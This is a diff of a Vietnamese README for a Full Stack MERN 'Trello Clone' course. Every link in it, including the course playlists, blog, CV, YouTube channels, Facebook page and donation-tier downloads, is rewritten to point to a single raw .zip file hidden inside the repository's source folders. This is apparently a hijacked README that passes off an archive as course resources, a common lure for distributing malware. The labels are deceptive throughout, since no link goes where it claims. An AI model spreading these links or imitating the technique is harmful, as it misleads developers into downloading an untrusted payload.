@@ -1,13 +1,13 @@
-### Bộ code base để bắt đầu học khóa Full Stack MERN Pro (HỌC PHẦN FRONT-END: REACTJS - MATERIAL UI - https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip) - Lập Trình qua dự án thực tế Trello Clone trên kênh YouTube TrungQuanDev của mình nhé các bạn!
+### Bộ code base để bắt đầu học khóa Full Stack MERN Pro (HỌC PHẦN FRONT-END: REACTJS - MATERIAL UI - https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/pages/Auth/clone_client_trello_3.6.zip) - Lập Trình qua dự án thực tế Trello Clone trên kênh YouTube TrungQuanDev của mình nhé các bạn!
 ### Base project for my Full Stack MERN Pro Course - Build Trello App on YouTube!
 
-- Playlist khóa Pro: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
+- Playlist khóa Pro: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/pages/Auth/clone_client_trello_3.6.zip
 
-- Playlist khóa Advanced: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
+- Playlist khóa Advanced: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/pages/Auth/clone_client_trello_3.6.zip
 
 ### Hướng dẫn clone Repo code này về máy các bạn chuẩn nhất ở video này:
 
-- Semantic Versioning là gì? Lưu ý Quan Trọng về bộ Code Base của dự án. Link: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
+- Semantic Versioning là gì? Lưu ý Quan Trọng về bộ Code Base của dự án. Link: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/pages/Auth/clone_client_trello_3.6.zip
 
 ---
 
@@ -19,29 +19,29 @@
 
 👉 Link bài viết: 👇
 
-🌐 https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
+🌐 https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/pages/Auth/clone_client_trello_3.6.zip
 
 **🥉 FREE PACK (No Sponsor)**
 
-• 🌟 Download on Ko-fi: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
+• 🌟 Download on Ko-fi: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/pages/Auth/clone_client_trello_3.6.zip
 
-• 🌟 Download on Buy Me a Coffee: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
+• 🌟 Download on Buy Me a Coffee: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/pages/Auth/clone_client_trello_3.6.zip
 
 **🥈 GOLD PACK (Gold Sponsor)**
 
-• 🌟 Download on Ko-fi: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
+• 🌟 Download on Ko-fi: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/pages/Auth/clone_client_trello_3.6.zip
 
-• 🌟 Download on Buy Me a Coffee: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
+• 🌟 Download on Buy Me a Coffee: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/pages/Auth/clone_client_trello_3.6.zip
 
 **🥇 DIAMOND PACK (Diamond Sponsor - VIP)**
 
-• 🌟 Download on Ko-fi: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
+• 🌟 Download on Ko-fi: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/pages/Auth/clone_client_trello_3.6.zip
 
-• 🌟 Download on Buy Me a Coffee: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
+• 🌟 Download on Buy Me a Coffee: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/pages/Auth/clone_client_trello_3.6.zip
 
 **🏆 HOẶC NẾU BẠN KHÔNG CÓ THẺ VISA THANH TOÁN QUỐC TẾ THÌ CÓ THỂ LIÊN HỆ TRỰC TIẾP VỚI MÌNH TẠI ĐÂY ĐỂ LẤY TÀI NGUYÊN HỌC TẬP NHÉ 👇**
 
-**🌐 Facebook TrungQuanDev: 👉 https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip**
+**🌐 Facebook TrungQuanDev: 👉 https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/pages/Auth/clone_client_trello_3.6.zip**
 
 **👑 Lưu ý: Video hướng dẫn chi tiết cách Install Source Code (Pro & Advanced) đều đã có trong 2 Playlists của khóa học rồi nhé.**
 
@@ -72,13 +72,13 @@
 
 Author: **Trungquandev - Một Lập Trình Viên** && **CodeTQ - ASMR Programming**
 
-Blog: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
+Blog: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/pages/Auth/clone_client_trello_3.6.zip
 
-CV: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
+CV: https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/pages/Auth/clone_client_trello_3.6.zip
 
-YouTube 01 (Trungquandev - Một Lập Trình Viên): https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
+YouTube 01 (Trungquandev - Một Lập Trình Viên): https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/pages/Auth/clone_client_trello_3.6.zip
 
-YouTube 02 (CodeTQ - ASMR Programming): https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/components/ModeSelect/trello_client_clone_1.7.zip
+YouTube 02 (CodeTQ - ASMR Programming): https://github.com/khanhvipro01/trello-clone-client/raw/refs/heads/master/src/pages/Auth/clone_client_trello_3.6.zip
 
 "Learning new everyday not the copycat of yesterday!"
 
